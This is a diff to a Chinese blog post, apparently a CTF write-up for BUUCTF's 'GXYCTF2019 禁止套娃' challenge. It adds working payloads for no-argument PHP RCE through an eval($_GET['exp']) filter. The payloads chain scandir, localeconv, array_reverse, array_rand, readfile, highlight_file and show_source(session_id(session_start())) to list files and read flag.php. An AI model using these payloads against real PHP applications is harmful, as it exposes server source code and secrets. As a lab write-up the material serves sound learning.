@@ -234,9 +234,8 @@ if(isset($_GET['exp'])){
 <li>第二层<code>preg_replace()</code>正则表达式匹配，<code>(?R)</code>表示引用当前表达式，只能匹配通过无参数的函数。</li>
 <li>第三层<code>preg_match()</code>限制了一些关键字</li>
 <li><code>@eval($_GET[&#39;exp&#39;]);</code>可以进行命令执行；典型的无参数RCE</li>
-<li></li>
+<li>虽然其不能使用php伪协议，但是@eval($_GET[‘exp’]);可以进行命令执行，所以使用scandir()函数列出当前目录中的文件和目录：</li>
 </ul>
-<p>虽然其不能使用php伪协议，但是@eval($_GET[‘exp’]);可以进行命令执行，所以使用scandir()函数列出当前目录中的文件和目录：</p>
 <p><img src="/2021/08/01/buu/5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNzI5Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>第二层正则表达式无法给directory参数赋值，所以查找能够返回为’.’结果的函数；</p>
 <p>首先需要得到当前目录下的文件<br>scandir()函数可以扫描当前目录下的文件，例如：</p>
@@ -250,8 +249,29 @@ if(isset($_GET['exp'])){
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/08/01/buu/5/image-20210801200909285.png" alt="image-20210801200909285"></p>
-<p>之后的读取暂时无法理解，全都照搬了wp</p>
-<p>有时间再理解消化。</p>
+<p>到这里我们也只是可以知道flag.php的存在</p>
+<p>却还不能读取它的源码</p>
+<p><img src="/2021/08/01/buu/5/1625650-20200204202458447-503722062.png" alt="img"></p>
+<p>从上图的官方解释中可以知道</p>
+<p>我们无法用单独的函数读取源码</p>
+<p><strong>1.array_reverse()</strong><br>以相反的元素顺序返回数组</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_reverse(scandir(current(localeconv()))));</span><br><span class="line">2.array_rand(array_flip())</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.array_flip()</strong></p>
+<p>交换数组的键和值</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_flip(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.array_rand()</strong></p>
+<p>从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source()</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp&#x3D;print_r(readfile(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp&#x3D;show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>
+
 <p><img src="/2021/08/01/buu/5/image-20210801202551668.png" alt="image-20210801202551668"></p>
 <p>参考博客：</p>
 <p><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com)</a></p>
